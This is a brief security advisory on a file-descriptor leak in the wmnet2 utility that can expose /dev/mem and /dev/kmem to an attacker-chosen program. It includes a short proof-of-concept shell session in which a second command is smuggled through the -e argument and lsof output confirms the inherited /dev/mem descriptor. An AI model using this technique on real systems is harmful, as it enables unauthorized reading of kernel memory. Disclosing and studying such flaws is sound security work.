It has been reported that wmnet2 is vulnerable to a leakage of open file descriptors that may result in unauthorized disclosure of kernel memory. It is allegedly possible for attackers to inherit the open file descriptors for /dev/mem and /dev/kmem by executing a malicious program through wmnet2. The program that is executed can be specified by the attacker at the command line.

bash-2.05a$ wmnet2 -e "dummy&/usr/local/sbin/lsof|grep
dummy|grep mem"
wmnet: using kmem driver to monitor ec0
dummy 584 dim 3r VCHR 2,0 0t0 21146 /dev/mem
